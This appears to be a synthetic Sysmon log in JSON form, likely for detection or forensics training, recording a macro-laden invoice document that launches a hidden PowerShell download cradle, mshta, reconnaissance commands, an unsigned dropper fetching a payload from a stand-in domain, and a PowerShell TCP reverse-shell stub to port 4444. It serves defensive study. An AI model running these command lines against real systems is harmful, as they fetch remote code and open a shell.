[
{"EventID":11,"UtcTime":"2023-08-14 09:12:04.101","Image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","TargetFilename":"C:\\Users\\jdoe\\Downloads\\Invoice_Aug2023.docm","ProcessGuid":"{aaa-0001}","ProcessId":"3120"},
{"EventID":1,"UtcTime":"2023-08-14 09:12:40.222","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -nop -w hidden -c Invoke-WebRequest -Uri http://192.168.56.104:8080/stage1.hta -OutFile C:\\Users\\jdoe\\AppData\\Local\\Temp\\stage1.hta","ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","ParentCommandLine":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jdoe\\Downloads\\Invoice_Aug2023.docm\"","ProcessGuid":"{aaa-0002}","ParentProcessGuid":"{aaa-0001}","User":"CORP\\jdoe"},
{"EventID":3,"UtcTime":"2023-08-14 09:12:41.010","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ProcessGuid":"{aaa-0002}","DestinationIp":"192.168.56.104","DestinationPort":"8080","Protocol":"tcp","Initiated":"true"},
{"EventID":11,"UtcTime":"2023-08-14 09:12:41.500","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetFilename":"C:\\Users\\jdoe\\AppData\\Local\\Temp\\stage1.hta","ProcessGuid":"{aaa-0002}"},
{"EventID":1,"UtcTime":"2023-08-14 09:12:55.300","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -c [Environment]::SetEnvironmentVariable('KDMTMP','C:\\Users\\jdoe\\AppData\\Local\\Temp','User')","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ProcessGuid":"{aaa-0003}","ParentProcessGuid":"{aaa-0002}"},
{"EventID":13,"UtcTime":"2023-08-14 09:12:55.400","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetObject":"HKU\\S-1-5-21-1004336348\\Environment\\KDMTMP","Details":"C:\\Users\\jdoe\\AppData\\Local\\Temp","EventType":"SetValue","ProcessGuid":"{aaa-0003}"},
{"EventID":1,"UtcTime":"2023-08-14 09:13:10.000","Image":"C:\\Windows\\System32\\mshta.exe","CommandLine":"mshta.exe C:\\Users\\jdoe\\AppData\\Local\\Temp\\stage1.hta","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ProcessGuid":"{aaa-0004}","ParentProcessGuid":"{aaa-0002}"},
{"EventID":1,"UtcTime":"2023-08-14 09:13:12.001","Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe /c whoami /all","ParentImage":"C:\\Windows\\System32\\mshta.exe","ProcessGuid":"{aaa-0005}","ParentProcessGuid":"{aaa-0004}"},
{"EventID":1,"UtcTime":"2023-08-14 09:13:12.002","Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe /c whoami /all","ParentImage":"C:\\Windows\\System32\\mshta.exe","ProcessGuid":"{aaa-0006}","ParentProcessGuid":"{aaa-0004}"},
{"EventID":1,"UtcTime":"2023-08-14 09:13:12.004","Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe /c whoami /all","ParentImage":"C:\\Windows\\System32\\mshta.exe","ProcessGuid":"{aaa-0007}","ParentProcessGuid":"{aaa-0004}"},
{"EventID":1,"UtcTime":"2023-08-14 09:13:13.100","Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe /c systeminfo","ParentImage":"C:\\Windows\\System32\\mshta.exe","ProcessGuid":"{aaa-0008}","ParentProcessGuid":"{aaa-0004}"},
{"EventID":1,"UtcTime":"2023-08-14 09:13:13.101","Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe /c systeminfo","ParentImage":"C:\\Windows\\System32\\mshta.exe","ProcessGuid":"{aaa-0009}","ParentProcessGuid":"{aaa-0004}"},
{"EventID":7,"UtcTime":"2023-08-14 09:13:20.000","Image":"C:\\Users\\jdoe\\AppData\\Local\\Temp\\update.exe","ImageLoaded":"C:\\Users\\jdoe\\AppData\\Local\\Temp\\_MEI123\\python311.dll","Signed":"false","ProcessGuid":"{aaa-0010}"},
{"EventID":7,"UtcTime":"2023-08-14 09:13:20.100","Image":"C:\\Users\\jdoe\\AppData\\Local\\Temp\\update.exe","ImageLoaded":"C:\\Users\\jdoe\\AppData\\Local\\Temp\\_MEI123\\_socket.pyd","Signed":"false","ProcessGuid":"{aaa-0010}"},
{"EventID":7,"UtcTime":"2023-08-14 09:13:20.200","Image":"C:\\Users\\jdoe\\AppData\\Local\\Temp\\update.exe","ImageLoaded":"C:\\Users\\jdoe\\AppData\\Local\\Temp\\_MEI123\\select.pyd","Signed":"false","ProcessGuid":"{aaa-0010}"},
{"EventID":7,"UtcTime":"2023-08-14 09:13:20.300","Image":"C:\\Users\\jdoe\\AppData\\Local\\Temp\\update.exe","ImageLoaded":"C:\\Windows\\System32\\msvcrt.dll","Signed":"true","ProcessGuid":"{aaa-0010}"},
{"EventID":22,"UtcTime":"2023-08-14 09:13:30.000","Image":"C:\\Users\\jdoe\\AppData\\Local\\Temp\\update.exe","QueryName":"cdn.malicious-update.io","QueryResults":"type:  5 192.168.56.104;","ProcessGuid":"{aaa-0010}"},
{"EventID":1,"UtcTime":"2023-08-14 09:13:31.000","Image":"C:\\Users\\jdoe\\AppData\\Local\\Temp\\update.exe","CommandLine":"update.exe --fetch http://cdn.malicious-update.io:8080/payload/final_stage.zip","ParentImage":"C:\\Windows\\System32\\mshta.exe","ProcessGuid":"{aaa-0011}","ParentProcessGuid":"{aaa-0004}"},
{"EventID":3,"UtcTime":"2023-08-14 09:13:32.000","Image":"C:\\Users\\jdoe\\AppData\\Local\\Temp\\update.exe","ProcessGuid":"{aaa-0011}","DestinationIp":"192.168.56.104","DestinationPort":"8080","DestinationHostname":"cdn.malicious-update.io","Protocol":"tcp","Initiated":"true"},
{"EventID":1,"UtcTime":"2023-08-14 09:14:02.000","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -nop -c $c=New-Object Net.Sockets.TCPClient('192.168.56.104',4444);$s=$c.GetStream()","ParentImage":"C:\\Users\\jdoe\\AppData\\Local\\Temp\\update.exe","ProcessGuid":"{aaa-0012}","ParentProcessGuid":"{aaa-0011}"},
{"EventID":3,"UtcTime":"2023-08-14 09:14:03.000","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ProcessGuid":"{aaa-0012}","DestinationIp":"192.168.56.104","DestinationPort":"4444","Protocol":"tcp","Initiated":"true"},
{"EventID":3,"UtcTime":"2023-08-14 09:15:00.000","Image":"C:\\Program Files\\Mozilla Firefox\\firefox.exe","ProcessGuid":"{bbb-0001}","DestinationIp":"142.250.183.4","DestinationPort":"443","Protocol":"tcp","Initiated":"true"}
]
